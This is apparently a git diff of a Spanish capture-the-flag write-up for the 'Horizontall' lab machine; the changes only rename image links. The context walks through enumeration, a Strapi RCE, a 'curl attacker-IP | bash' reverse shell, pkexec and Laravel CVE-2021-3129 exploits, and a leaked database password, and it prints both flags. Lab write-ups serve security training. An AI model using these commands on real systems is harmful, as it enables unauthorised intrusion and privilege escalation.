@@ -18,11 +18,11 @@ nmap -p- --open -sS -sCV -T5 10.10.11.105 -vvv -n -Pn escaneo_nmap
 
 Nos salen 3 puertos abiertos:
 
-![image](../zimages/Pasted%20image%2020241105155724.png)
+![image](../zimages/Pasted_image_20241105155724.png)
 
 Si hacemos un whatweb de la ip víctima, nos da un código '301', pero también nos da un dominio que lo pondremos en el archivo "/etc/hosts":
 
-![image](../zimages/Pasted%20image%2020241105155704.png)
+![image](../zimages/Pasted_image_20241105155704.png)
 
 
 # Fuzzing
@@ -37,7 +37,7 @@ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/
 
 Esto es lo que nos encuentra:
 
-![image](../zimages/Pasted%20image%2020241105161127.png)
+![image](../zimages/Pasted_image_20241105161127.png)
 
 Como no encuentra nada de valor, vamos a probar a escanear por subdominios:
 
@@ -47,7 +47,7 @@ wfuzz -c --hh=194 -t 200 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomai
 
 Y nos encuentra el siguiente:
 
-![image](../zimages/Pasted%20image%2020241105163944.png)
+![image](../zimages/Pasted_image_20241105163944.png)
 
 Metemos el subdominio en "/etc/hosts" y nos metemos en la web, pero solo nos aparece el mensaje de "Welcome", así que volvemos a hacer fuzzing de directorios en esa url ('http://api-prod.horizontall.htb/'):
 
@@ -57,7 +57,7 @@ wfuzz -c --hc=404 -t 200 -2 /usr/share/wordlists/SecLists/Discovery/directory-li
 
 Nos saca los siguientes subdirectorios:
 
-![image](../zimages/Pasted%20image%2020241105170712.png)
+![image](../zimages/Pasted_image_20241105170712.png)
 
 Si nos vamos a '/admin', nos encontramos con un panel de login con el nombre de Strapi, que si buscamos este nombre por internet, nos sale que es un CMS (gestor de contenido) basado en Node. Si probamos a loguearnos con las credenciales por defecto (admin:admin), no nos deja. 
 Vamos a hacer fuzzing del directorio '/admin' ya que, cuando entramos, nos redirige automáticamente a '/auth/login':
@@ -68,7 +68,7 @@ wfuzz -c --hh=854 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/
 
 Esto es lo que nos encuentra:
 
-![image](../zimages/Pasted%20image%2020241105171532.png)
+![image](../zimages/Pasted_image_20241105171532.png)
 
 
 # Strapi Exploitation
@@ -81,7 +81,7 @@ curl http://api-prod.horizontall.htb/admin/init | jq
 
 Nos da la siguiente versión de "Strapi":
 
-![image](../zimages/Pasted%20image%2020241105171742.png)
+![image](../zimages/Pasted_image_20241105171742.png)
 
 Vamos a buscar esa versión con el siguiente comando 
 
@@ -91,11 +91,11 @@ searchsploit Strapi 3.0.0-beta.17.4
 
 Nos da una vulnerabilidad de RCE (Remote Code Execution), la descargamos:
 
-![image](../zimages/Pasted%20image%2020241105171958.png)
+![image](../zimages/Pasted_image_20241105171958.png)
 
 Si ejecutamos el exploit, vemos que nos da un token de usuario, es decir, que se ha ejecutado correctamente y tenemos ejecución remota de comandos, el problema es que no nos muestra ningún output:
 
-![image](../zimages/Pasted%20image%2020241105172211.png)
+![image](../zimages/Pasted_image_20241105172211.png)
 
 Vamos a probar a hacernos un ping a nuestra máquina atacante a ver si nos ejecuta los comandos. Lo primero es activar tcpdump para ver el ping:
 
@@ -110,7 +110,7 @@ tcpdump -i tun0 icmp -n
 
 Esto es lo que recibimos:
 
-![image](../zimages/Pasted%20image%2020241105172827.png)
+![image](../zimages/Pasted_image_20241105172827.png)
 
 Quiere decir que tenemos RCE, vamos a intentar conseguir una reverse shell. Para no liarla mucho, vamos a crearnos un archivo .html con el siguiente código:
 
@@ -128,26 +128,26 @@ curl 10.10.14.17 | bash
 
 Le decimos que nos haga un curl a nuestra ip y, como es un archivo index.html, leerá directamente el código, después lo pipeamos con bash para que lo interprete directamente con bash, de esta manera, recibimos nuestra shell:
 
-![image](../zimages/Pasted%20image%2020241105173351.png)
+![image](../zimages/Pasted_image_20241105173351.png)
 
 De esta manera ya tenemos la flag de user (`39a1ef07f9adbf92023ce6010e816733`):
 
-![image](../zimages/Pasted%20image%2020241105173445.png)
+![image](../zimages/Pasted_image_20241105173445.png)
 
 
 # Privilege escalation (Option pkexec)
 
 Ahora tenemos que ampliar privilegios, así que vamos a mirar si tenemos alguna opción listando binarios SUID con el comando `find / -perm -4000 2>/dev/null`:
 
-![image](../zimages/Pasted%20image%2020241105175307.png)
+![image](../zimages/Pasted_image_20241105175307.png)
 
 Vemos el pkexec, vamos a ver quien es el owner:
 
-![image](../zimages/Pasted%20image%2020241105175341.png)
+![image](../zimages/Pasted_image_20241105175341.png)
 
 Es root, vamos a probar a descargarnos en nuestra máquina atacante el script de python para explotar esto. En mi caso lo descargué de este repositorio (https://github.com/Almorabea/pkexec-exploit). Vamos a clonarlo con `git clone [url]`, lo compartimos con la máquina víctima y lo ejecutamos con python3:
 
-![image](../zimages/Pasted%20image%2020241105175958.png)
+![image](../zimages/Pasted_image_20241105175958.png)
 
 Ya somos root :)
 
@@ -156,7 +156,7 @@ Ya somos root :)
 
 Ahora tenemos que ampliar privilegios, vamos a explorar en el directorio home de strapi ('/opt/strapi'). Si exploramos un poco, vemos que en el directorio '/opt/strapi/myapi/config/environments/development', hay un archivo "database.json", si lo leemos vemos la siguiente información:
 
-![image](../zimages/Pasted%20image%2020241105173807.png)
+![image](../zimages/Pasted_image_20241105173807.png)
 
 Vamos a internar entrar en mysql con estas credenciales:
 
@@ -166,7 +166,7 @@ mysql -udeveloper -p'#J!:F9Zt2u'
 
 Si exploramos un poco en mysql, vemos que en la tabla strapi_administrator de la base de datos Strapi, nos da unas credenciales de admin:
 
-![image](../zimages/Pasted%20image%2020241105174457.png)
+![image](../zimages/Pasted_image_20241105174457.png)
 
 Pero si las intentamos crackear, no nos muestra nada. Vamos a buscar por puertos abiertos dentro de la máquina:
 
@@ -176,7 +176,7 @@ netstat -nat
 
 Nos aparecen los puertos que vimos antes con el escaneo de nmap (22,80), pero también nos aparecen 2 más, el 1337, que no nos interesa y el 8000, que si le hacemos un curl nos muestra que está corriendo Laravel por http:
 
-![image](../zimages/Pasted%20image%2020241105180325.png)
+![image](../zimages/Pasted_image_20241105180325.png)
 
 Vamos a hacer un port forwarding para poder ver la web en nuestra máquina.
 Para ello nos descargaremos chisel desde el repoo de github oficial (https://github.com/jpillora/chisel)
@@ -191,7 +191,7 @@ A continuación lo compilamos, se puede hacer de 2 maneras:
 
 Se puede compilar directamente con el comando `go build .` y listo, el problema es que así nos va a ocupar mucho (14Mb):
 
-![image](../zimages/Pasted%20image%2020241104233110.png)
+![image](../zimages/Pasted_image_20241104233110.png)
 
 ### Manera 2
 
@@ -210,7 +210,7 @@ Después de compartirlo en la máquina víctima, vamos a ejecutar el siguiente c
 
 Nos sale esto:
 
-![image](../zimages/Pasted%20image%2020241105182116.png)
+![image](../zimages/Pasted_image_20241105182116.png)
 
 A continuación ejecutamos lo siguiente en la máquina víctima, tras darle al ejecutable de chisel permisos de ejecución con `chmod +x chisel`:
 
@@ -225,15 +225,15 @@ A continuación ejecutamos lo siguiente en la máquina víctima, tras darle al e
 
 Nos saldrá esto:
 
-![image](../zimages/Pasted%20image%2020241105182408.png)
+![image](../zimages/Pasted_image_20241105182408.png)
 
 Y en nuestra máquina atacante nos saldrá un aviso:
 
-![image](../zimages/Pasted%20image%2020241105182439.png)
+![image](../zimages/Pasted_image_20241105182439.png)
 
 De esta manera ya podemos acceder a la web del puerto 8000 mediante nuestro navegador, poniendo `localhost:8000`:
 
-![image](../zimages/Pasted%20image%2020241105182603.png)
+![image](../zimages/Pasted_image_20241105182603.png)
 
 Aquí también nos muestra la versión de Laravel, vamos a buscarla por internet para ver si hay algún exploit en github, en mi caso me funcionó este repositorio (https://github.com/nth347/CVE-2021-3129_exploit), nos lo clonamos y lo ejecutamos siguiendo las instrucciones del exploit:
 
@@ -243,17 +243,17 @@ python3 exploit.py http://localhost:8000 Monolog/RCE1 id
 
 Si nos fijamos en el output vemos que tenemos RCE como root:
 
-![image](../zimages/Pasted%20image%2020241105182906.png)
+![image](../zimages/Pasted_image_20241105182906.png)
 
 Ahora vamos a seguir el mismo procedimiento de antes para conseguir una reverse shell. Nos montamos un server en python en el directorio donde tengamos el archivo index.html con la reverse shell y nos ponemos en escucha con netcat, a continuación, ejecutamos el comando `curl http://10.10.14.17 | bash` en el exploit (siguiendo las instrucciones), si ponemos un `whoami`, ya somos root :)
 
-![image](../zimages/Pasted%20image%2020241105183351.png)
+![image](../zimages/Pasted_image_20241105183351.png)
 
 Ahora nos vamos al directorio de '/root' y leemos la flag de root (`fcd5d89e5d7ea86ce34131624ff2d851`):
 
-![image](../zimages/Pasted%20image%2020241105184541.png)
+![image](../zimages/Pasted_image_20241105184541.png)
 
-![image](../zimages/Pasted%20image%2020241105183451.png)
+![image](../zimages/Pasted_image_20241105183451.png)
 
 # ./ROOTED
 
